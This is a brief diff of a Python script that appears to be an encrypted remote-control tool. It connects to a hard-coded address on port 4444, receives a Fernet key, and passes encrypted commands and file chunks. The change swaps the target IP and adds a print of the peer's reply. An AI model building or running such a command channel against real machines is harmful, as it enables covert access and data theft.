@@ -29,7 +29,7 @@ print("""
 """)
 conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-conn.connect(('192.168.50.200',4444))
+conn.connect(('192.168.50.232',4444))
 
 key = conn.recv(1024)
 cipher = Fernet(key)
@@ -96,6 +96,7 @@ Commands:
                     conn.sendall(chunk)
             except:
                 conn.send(Encrypt(b'Wrong file name'))
+            print(Decrypt(conn.recv(1024)).decode())
         else:
             conn.sendall(Encrypt(payload.encode()))
             len_chunks = Decrypt(conn.recv(1024)).decode()
